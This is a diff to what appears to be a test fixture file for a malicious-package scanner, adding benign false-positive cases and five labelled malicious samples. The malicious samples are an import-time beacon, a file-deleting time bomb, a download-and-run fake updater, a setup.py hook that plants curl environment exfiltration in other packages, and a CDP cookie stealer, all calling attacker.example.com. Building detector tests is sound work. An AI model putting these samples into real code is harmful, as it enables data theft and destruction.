@@ -1621,6 +1621,250 @@ if __name__ == "__main__":
     asyncio.run(main())
 '''},
     ),
+    # ─── 사이클 10: false-positive 스트레스 테스트 ──────────
+    # 정상 패키지지만 표면적으로 의심스러운 패턴
+    _ben(
+        "ansible-shell-module",
+        description="Ansible shell 태스크 — subprocess + shell=True (정상)",
+        files={"shell.py": '''
+"""Ansible-style shell module — runs commands as part of automation."""
+import subprocess
+
+def run_shell(cmd: str, timeout: int = 60) -> dict:
+    """
+    Standard automation tool: executes user-provided shell command.
+    This is a legitimate function in IaC tooling (Ansible / SaltStack pattern).
+    """
+    result = subprocess.run(
+        cmd, shell=True, capture_output=True, text=True, timeout=timeout
+    )
+    return {
+        "stdout": result.stdout,
+        "stderr": result.stderr,
+        "rc": result.returncode,
+    }
+'''},
+    ),
+    _ben(
+        "test-fixture-with-env",
+        description="pytest fixture — 환경변수 설정 + 외부 호출 (테스트 정상)",
+        files={"conftest.py": '''
+"""pytest fixture for integration tests."""
+import os
+import pytest
+import requests
+
+@pytest.fixture(scope="session")
+def api_base() -> str:
+    return os.environ.get("API_BASE_URL", "http://localhost:8080")
+
+@pytest.fixture
+def auth_token() -> str:
+    return os.environ.get("TEST_AUTH_TOKEN", "test-token")
+
+@pytest.fixture
+def http_session(api_base, auth_token):
+    s = requests.Session()
+    s.headers.update({"Authorization": f"Bearer {auth_token}"})
+    return s
+
+def test_health(http_session, api_base):
+    r = http_session.get(f"{api_base}/health")
+    assert r.status_code == 200
+'''},
+    ),
+    _ben(
+        "deployment-script",
+        description="배포 스크립트 — git pull + pip install + service restart",
+        files={"deploy.py": '''
+"""Production deployment script."""
+import subprocess
+import sys
+
+def deploy(branch: str = "main") -> int:
+    steps = [
+        ["git", "fetch", "origin"],
+        ["git", "checkout", branch],
+        ["git", "pull", "--ff-only"],
+        ["pip", "install", "-r", "requirements.txt"],
+        ["systemctl", "restart", "myapp.service"],
+    ]
+    for cmd in steps:
+        print(f"+ {' '.join(cmd)}")
+        result = subprocess.run(cmd)
+        if result.returncode != 0:
+            return result.returncode
+    return 0
+
+if __name__ == "__main__":
+    sys.exit(deploy(sys.argv[1] if len(sys.argv) > 1 else "main"))
+'''},
+    ),
+    _ben(
+        "unittest-mock-patching",
+        description="unittest.mock.patch 사용 (legit monkey-patch — test only)",
+        files={"test_mock.py": '''
+"""Test with unittest.mock.patch — legitimate test monkey-patching."""
+from unittest.mock import patch, MagicMock
+
+def test_external_api_call():
+    with patch("requests.get") as mock_get:
+        mock_get.return_value.json.return_value = {"ok": True}
+        # production 코드 호출
+        import requests
+        result = requests.get("https://api.example.com").json()
+        assert result == {"ok": True}
+        mock_get.assert_called_once()
+'''},
+    ),
+    _ben(
+        "telemetry-opt-in-sender",
+        description="opt-in 텔레메트리 (정상 — 사용자 동의 후만)",
+        files={"telemetry.py": '''
+"""Opt-in usage telemetry (e.g., as in Homebrew, npm, pip)."""
+import json
+import os
+import platform
+import requests
+
+ENDPOINT = "https://telemetry.example-tool.org/v1/events"
+
+def is_enabled() -> bool:
+    """User must explicitly opt in."""
+    return os.environ.get("MY_TOOL_TELEMETRY") == "1"
+
+def send_event(name: str, properties: dict | None = None) -> None:
+    if not is_enabled():
+        return
+    payload = {
+        "event": name,
+        "tool_version": "1.2.3",
+        "python": platform.python_version(),
+        "os": platform.system(),
+        "properties": properties or {},
+    }
+    try:
+        requests.post(ENDPOINT, json=payload, timeout=2)
+    except Exception:
+        pass
+'''},
+    ),
+    # ─── 사이클 10: 악성 5 (의심스럽지만 까다로운 케이스) ────
+    _mal(
+        "stealthy-init-on-import",
+        description="__init__.py 가 import 시점에 외부 송신 (잠수)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXS-001 (Import-Time Execution)",
+        files={"__init__.py": '''
+"""Public package __init__."""
+from .api import *  # noqa: F401, F403
+
+# 정상 import 처럼 보이지만, import 시점에 silently 실행
+import os
+import requests
+try:
+    requests.post(
+        "https://attacker.example.com/installed",
+        json={
+            "user": os.environ.get("USER"),
+            "host": os.uname().nodename if hasattr(os, "uname") else "?",
+            "cwd":  os.getcwd(),
+        },
+        timeout=2,
+    )
+except Exception:
+    pass
+'''},
+    ),
+    _mal(
+        "delayed-payload-time-bomb",
+        description="3 일 후 활성화되는 시한 폭탄 (날짜 비교)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="time-conditional + dangerous action",
+        files={"helper.py": '''
+import datetime, os, shutil
+INSTALL_DATE = datetime.datetime(2026, 4, 1)
+if datetime.datetime.now() > INSTALL_DATE + datetime.timedelta(days=3):
+    # 3일 지나면 발화
+    home = os.path.expanduser("~")
+    for d in ("Documents", "Pictures"):
+        try:
+            shutil.rmtree(os.path.join(home, d))
+        except Exception:
+            pass
+'''},
+    ),
+    _mal(
+        "fake-update-checker",
+        description="\"업데이트 확인\" 으로 가장하지만 실제론 페이로드 다운+실행",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="description-behavior mismatch",
+        files={"updater.py": '''
+import requests, subprocess
+
+def check_for_updates():
+    """Check for updates and apply them."""
+    # 실제로는 임의 파일을 받아 실행
+    r = requests.get("https://attacker.example.com/latest.sh")
+    with open("/tmp/.update", "wb") as f:
+        f.write(r.content)
+    subprocess.run(["bash", "/tmp/.update"], check=False)
+'''},
+    ),
+    _mal(
+        "supply-chain-poisoned-build-tool",
+        description="빌드 시 다른 패키지에 페이로드 주입 (cross-pollination)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="cross-package poisoning",
+        files={"setup.py": '''
+"""Build hook that injects payload into sibling packages."""
+from setuptools import setup
+from setuptools.command.install import install
+import os, glob, site
+
+class CrossPoison(install):
+    def run(self):
+        install.run(self)
+        # 동일 환경의 다른 패키지의 __init__.py 에 페이로드 추가
+        for sp in site.getsitepackages():
+            for init in glob.glob(os.path.join(sp, "*", "__init__.py")):
+                if "evil-pkg" in init:
+                    continue
+                try:
+                    with open(init, "a") as f:
+                        f.write(
+                            "\\nimport os; os.system("
+                            "'curl -d $(env | base64) https://attacker.example.com/x'"
+                            ")\\n"
+                        )
+                except Exception:
+                    pass
+
+setup(name="evil-pkg", cmdclass={"install": CrossPoison})
+'''},
+    ),
+    _mal(
+        "cookie-grab-via-cdp",
+        description="Chrome DevTools Protocol (CDP) 로 cookie 추출",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="CDP-based stealing",
+        files={"cdp.py": '''
+import json, requests, subprocess
+# Chrome 을 remote debug 모드로 띄움
+subprocess.Popen(
+    ["google-chrome", "--remote-debugging-port=9222", "--headless"],
+    stdout=subprocess.DEVNULL,
+)
+# CDP 로 cookies 추출
+tabs = requests.get("http://localhost:9222/json").json()
+for tab in tabs:
+    ws = requests.get(tab["webSocketDebuggerUrl"])
+    # ... CDP 명령 ...
+# 결과 외부 송신
+requests.post("https://attacker.example.com/cookies",
+              json={"tabs": tabs})
+'''},
+    ),
     # ─── 정상 fixture 추가 10 ───────────────────────────────
     _ben(
         "fastapi-style-app",
